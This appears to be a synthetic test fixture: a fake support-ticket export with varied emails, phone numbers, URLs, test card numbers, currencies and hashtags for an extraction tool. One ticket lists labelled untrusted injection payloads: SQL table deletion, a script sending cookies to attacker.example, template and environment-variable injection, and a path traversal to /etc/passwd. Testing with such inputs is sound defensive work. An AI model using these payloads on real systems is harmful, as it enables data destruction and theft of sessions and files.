@@ -1,0 +1,105 @@
+============================================================
+ SUPPORT TICKET EXPORT  -  batch_id: 4471-A   (raw dump)
+ Source: external CRM webhook (untrusted)
+============================================================
+
+[ticket #88213]  opened 2026-05-12 09:14 UTC
+From: "Jeanne Mukamana" <jeanne.mukamana@alueducation.com>
+Reply-To: jmukamana+support@alueducation.com
+CC: Operations Desk <ops-desk@alueducation.com>, archivist@alumni.alueducation.com
+
+Hi team,
+
+Following up on the onboarding session we ran last Thursday. A few students
+flagged issues, summarised below. Please loop in the SI office
+(records.office@si.alueducation.com) when you reply.
+
+  -  Student portal at https://portal.alueducation.com/students/dashboard
+     keeps logging people out. Mirror: http://portal.alueducation.com:8080/healthz
+  -  Calendar feed (webcal link) reachable via
+     https://calendar.alueducation.com/feed?cohort=2026&format=ics&tz=Africa/Kigali
+     was 500-ing between 02:00 and 04:30 last night.
+  -  Two parents called the Kigali line: +250 788 123 456 and (+250) 788-987-654.
+     A third reached us on the US relay: +1 (415) 555-0199 ext.27.
+     Local backup line: 0788 555 014.
+
+Payment receipts came back from the gateway. The full PANs were exposed
+in the webhook payload (we have asked the vendor to fix this):
+
+   4111 1111 1111 1111      <-- test card, should be flagged
+   5500-0000-0000-0004
+   3782 822463 10005        (Amex, 15 digits)
+   6011000990139424
+   4539 1488 0343 6467
+
+One number in there looks like a typo / fraud bait, please double check:
+   4111-1111-1111-1112  (does not pass Luhn)
+
+Refund window closes 11:30 PM tomorrow; the night-shift handover is at 23:45
+and the second sync at 07:05 AM. Use the 14:00 slot for the parent call back.
+
+Budget impact for this batch:
+   waived fees:    $1,250.00
+   FX adjustment:  -€340.50
+   stipend top-up: £75
+   regional fund:  RWF 1,250,000
+   misc:           USD 9.99   and    12,500.00 KES
+
+Social mentions to monitor:  #ALUClassOf2026  #StudentSupport
+                              #leadership-african-youth   #404NotFound
+
+Snippet copied from the dashboard (please escape before re-rendering):
+
+   <div class="alert alert--danger" data-ticket="88213">
+       <h3>Heads up</h3>
+       <p>Session expired. <a href="/login?next=%2Fdashboard">Sign in</a></p>
+       <img src="/static/img/warn.svg" alt="warn" />
+   </div>
+
+------------------------------------------------------------
+[ticket #88214]  opened 2026-05-12 10:02 UTC
+From: anonymous-tipster <weird name@@evil.example.com>     <-- malformed, drop it
+Also failing: not-an-email, bob@localhost, @nodomain.com, spaced @ alueducation.com
+
+NOTE FROM SECURITY:
+The next two lines were submitted via the public contact form and MUST NOT
+be trusted, executed, rendered, or interpolated into any query / template:
+
+    '); DROP TABLE students;--
+    <script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
+    {{7*7}}        ${process.env.SECRET}        ../../../../etc/passwd
+
+A user pasted these "cards" as a joke - none are real PANs, the extractor
+should still apply Luhn before trusting any of them:
+
+   1234 5678 9012 3456     0000-0000-0000-0000     9999999999999999
+
+Legit alumna follow-up below:
+  - Name: Aline U.
+  - Email: aline.uwase@alumni.alueducation.com
+  - Backup: aline.uwase93@gmail.com
+  - Personal site: https://aline.dev/portfolio/2026?ref=alu&utm=newsletter
+  - GitHub: https://github.com/aline-u/alu-projects
+  - Mobile: +250-789-456-321
+
+She paid the alumni-network dues with card 4263 9826 4026 9299 at 3:42 pm
+(receipt #R-22841, amount: $25.00). Reconciliation cron runs at 00:00 and 12:00.
+
+------------------------------------------------------------
+[ticket #88215]  opened 2026-05-12 11:47 UTC
+From: Faculty Bot <noreply@alueducation.com>
+Body:
+
+Reminder - quarterly newsletter goes out at 6:00 AM and 18:30.
+Track engagement at https://analytics.alueducation.com/dashboards/newsletter?range=30d
+Hashtag campaign: #AfricanLeadership #ALUImpact #Cohort_2026
+
+Budget line items pending approval:
+    €12.00, $4,800, ¥1500, £0.99, RWF 500, USD 1,000,000.00
+
+Bad data appended by an upstream parser (DO NOT extract):
+    email:  <<<not.an.email>>>    phone: 12  card: 41111
+    url:    htp:/broken..example  hashtag: ## tag: <scriptscript>
+============================================================
+ END OF BATCH
+============================================================
